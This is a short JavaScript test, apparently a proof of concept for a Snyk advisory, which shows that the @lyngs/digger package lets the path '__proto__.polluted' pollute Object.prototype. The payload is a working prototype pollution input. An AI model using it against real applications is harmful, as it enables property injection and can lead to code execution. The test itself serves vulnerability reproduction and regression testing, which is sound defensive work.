//https://security.snyk.io/vuln/SNYK-JS-LYNGSDIGGER-1069826
test("prototype pollution in @lyngs/digge", () => {
  const { digger } = require("@lyngs/digger");
  expect({}.polluted).toBe(undefined);
  digger({}, "__proto__.polluted", "yes", { extend: true });
  expect({}.polluted).toBe("yes");
});
